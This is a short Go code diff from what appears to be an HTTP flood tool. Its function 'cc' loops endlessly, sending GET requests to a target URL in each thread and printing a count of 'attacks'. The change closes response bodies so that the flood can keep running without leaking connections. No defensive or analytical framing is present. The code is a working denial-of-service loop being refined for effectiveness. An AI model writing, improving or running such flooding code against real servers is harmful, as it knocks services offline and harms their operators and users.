@@ -13,8 +13,11 @@ func cc(url string, num int) {
 	num2 := 0
 	for true {
 		num2++
-		http.Get(url)
+		resp, _ := http.Get(url)
 		fmt.Printf("The current thread is %d and the number of attacks is %d\n", num, num2)
+		if resp != nil {
+			resp.Body.Close()
+		}
 	}
 	wg.Done()
 }
